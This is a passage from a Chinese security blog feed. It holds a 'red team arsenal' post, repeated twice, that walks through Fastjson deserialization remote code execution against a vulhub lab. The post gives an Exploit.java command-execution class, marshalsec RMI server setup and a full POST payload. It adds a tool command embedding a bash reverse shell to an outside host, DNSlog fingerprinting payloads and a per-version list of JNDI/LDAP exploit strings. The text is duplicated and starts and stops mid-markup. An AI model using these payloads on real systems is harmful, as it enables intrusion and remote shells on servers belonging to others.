class="doctag">@type</span>":"com.sun.rowset.JdbcRowSetImpl",</span></span><br><span class="line"><span class="comment">        "dataSourceName":"rmi://2.2.2.2:9999/Exploit",</span></span><br><span class="line"><span class="comment">        "autoCommit":true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>此时主机A收到POST请求，触发反序列化漏洞，最终执行Exploit.class 文件中的内容</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NDgucG5n?x-oss-process=image/format,png" alt="image-20200703234748062"></p><p>我使用的是反弹shell命令</p><p>反弹shell成功：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQxMTUucG5n?x-oss-process=image/format,png" alt="image-20200703234115010"></p><h1 id="0x05简化版攻击工具"><a href="#0x05简化版攻击工具" class="headerlink" title="0x05简化版攻击工具"></a>0x05简化版攻击工具</h1><p>下面提供一个简化版工具的工具</p><p>是使用<a href="https://github.com/wyzxxz/fastjson_rce_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson_rce_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包</a></p><p>第一步：只需要在自己的服务器上启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 &quot;bash&#x3D;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;80 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>第二步：发送payload</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NTQucG5n?x-oss-process=image/format,png" alt=""></p><p>成功反弹shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ5MTQucG5n?x-oss-process=image/format,png" alt="image-20200703234914580"></p><h1 id="0x06-漏洞检测"><a href="#0x06-漏洞检测" class="headerlink" title="0x06 漏洞检测"></a>0x06 漏洞检测</h1><h2 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h2><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p><p>例如</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI2MTcucG5n?x-oss-process=image/format,png" alt="image-20200704162617071"></p><h2 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h2><p>我使用以下payload测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI4NDQucG5n?x-oss-process=image/format,png" alt="image-20200704162844047"></p><p>最终收到dnslog</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI5MjIucG5n?x-oss-process=image/format,png" alt="image-20200704162922529"></p><h2 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>畸形的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjMxNTAucG5n?x-oss-process=image/format,png" alt=""></p><p>POC:</p><p>要嵌套在里面zeo里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h1 id="0x07-多版本payload集合"><a href="#0x07-多版本payload集合" class="headerlink" title="0x07 多版本payload集合"></a>0x07 多版本payload集合</h1><p>影响版本：  </p><h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;x.x.x.x:1999&#x2F;Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红队武器库:fastjson小于1.2.68全漏洞RCE利用exp复现</title>
      <link href="/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01漏洞介绍"><a href="#0x01漏洞介绍" class="headerlink" title="0x01漏洞介绍"></a>0x01漏洞介绍</h1><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><h1 id="0x02影响范围"><a href="#0x02影响范围" class="headerlink" title="0x02影响范围"></a>0x02影响范围</h1><p>Fastjson &lt; 1.2.68</p><p>Fastjson爆出的绕过方法可以通杀1.2.68版本以下所有</p><h1 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h1><p>下面以Fastjson 1.2.47 为例子，因为vulhub有现成的环境十分方便</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P牛我用vulhub中的 1.2.47的docker   想测试doslog检查 fastjson 但是总是收到不到dnslog  但是正常的exp反弹shell就是可以我很疑惑    </span><br><span class="line">我的用法正确吗，用的这个&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;bouaiq.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="下面是流程示意图"><a href="#下面是流程示意图" class="headerlink" title="下面是流程示意图"></a>下面是流程示意图</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png" alt="image-20200704111745527"></p><p>主机A：存在fastjson反序列化漏洞的主机<br>主机C：为RMI/LDAP服务<br>主机B：为构造的恶意类（包含要执行的命令）</p><h3 id="在整个远程命令执行流程"><a href="#在整个远程命令执行流程" class="headerlink" title="在整个远程命令执行流程"></a>在整个远程命令执行流程</h3><p>1、黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</p><p>2、主机A引发反序列化漏洞，发送了进行rmi远程发放调用，去连接主机C</p><p>3、主机C的rmi服务指定加载主机B的恶意java类，所以主机A通过主机C的rmi服务最终加载并执行主机B的恶意java类</p><p>4、主机A引发恶意系统命令执行</p><h1 id="0x04复现流程"><a href="#0x04复现流程" class="headerlink" title="0x04复现流程"></a>0x04复现流程</h1><p>根据上图流程和环境复现：</p><p>主机A： <a href="http://1.1.1.1:8090/" target="_blank" rel="noopener">http://1.1.1.1:8090</a> (存在Fastjson漏洞主机)<br>主机B： <a href="http://2.2.2.2:8888/" target="_blank" rel="noopener">http://2.2.2.2:8888</a> (恶意java类服务)<br>主机C： rmi://2.2.2.2:9999 (远程方法调用服务)</p><p>实际上主机B和C是一台机器不同端口）</p><h2 id="0x041-构造恶意方法"><a href="#0x041-构造恶意方法" class="headerlink" title="0x041 构造恶意方法"></a>0x041 构造恶意方法</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码</p><p>使用如下payload：</p><p>其中touch /zydx666为系统命令，可以根据自己需求随意修改</p><p>注意该文件名叫Exploit.java固定格式不能变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Exploit() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"touch /zydx666"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(String[] args) throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主机B中使用javac命令编译Exploit.java文件，生成一个Exploit.class文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure><p>然后在主机B启一个http服务，中间件随意，但是需要能访问到Exploit.class文件，这里使用python3临时启动一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure><h2 id="0x042-开启远程方法调用rmi服务"><a href="#0x042-开启远程方法调用rmi服务" class="headerlink" title="0x042 开启远程方法调用rmi服务"></a>0x042 开启远程方法调用rmi服务</h2><p>接下来在<strong>主机C</strong>开启rmi服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.1.1.1:8888/#Exploit" 9999</span><br></pre></td></tr></table></figure><p>marshalsec-0.0.3-SNAPSHOT-all.jar</p><p>参考 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p><p>至此服务已经全部就绪</p><h2 id="0x043-发送payload"><a href="#0x043-发送payload" class="headerlink" title="0x043 发送payload"></a>0x043 发送payload</h2><p>接下来向<strong>主机A</strong>（存在漏洞机子）发送fastjson反序列化漏洞payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    "a":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"java.lang.Class",</span></span><br><span class="line"><span class="comment">        "val":"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    "b":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"com.sun.rowset.JdbcRowSetImpl",</span></span><br><span class="line"><span class="comment">        "dataSourceName":"rmi://2.2.2.2:9999/Exploit",</span></span><br><span class="line"><span class="comment">        "autoCommit":true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>此时主机A收到POST请求，触发反序列化漏洞，最终执行Exploit.class 文件中的内容</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NDgucG5n?x-oss-process=image/format,png" alt="image-20200703234748062"></p><p>我使用的是反弹shell命令</p><p>反弹shell成功：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQxMTUucG5n?x-oss-process=image/format,png" alt="image-20200703234115010"></p><h1 id="0x05简化版攻击工具"><a href="#0x05简化版攻击工具" class="headerlink" title="0x05简化版攻击工具"></a>0x05简化版攻击工具</h1><p>下面提供一个简化版工具的工具</p><p>是使用<a href="https://github.com/wyzxxz/fastjson\_rce\_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson\_rce\_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包</a></p><p>第一步：只需要在自己的服务器上启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 &quot;bash&#x3D;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;80 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>第二步：发送payload</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NTQucG5n?x-oss-process=image/format,png" alt=""></p><p>成功反弹shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ5MTQucG5n?x-oss-process=image/format,png" alt="image-20200703234914580"></p><h1 id="0x06-漏洞检测"><a href="#0x06-漏洞检测" class="headerlink" title="0x06 漏洞检测"></a>0x06 漏洞检测</h1><h2 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h2><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p><p>例如</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI2MTcucG5n?x-oss-process=image/format,png" alt="image-20200704162617071"></p><h2 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h2><p>我使用以下payload测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI4NDQucG5n?x-oss-process=image/format,png" alt="image-20200704162844047"></p><p>最终收到dnslog</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI5MjIucG5n?x-oss-process=image/format,png" alt="image-20200704162922529"></p><h2 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>畸形的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img 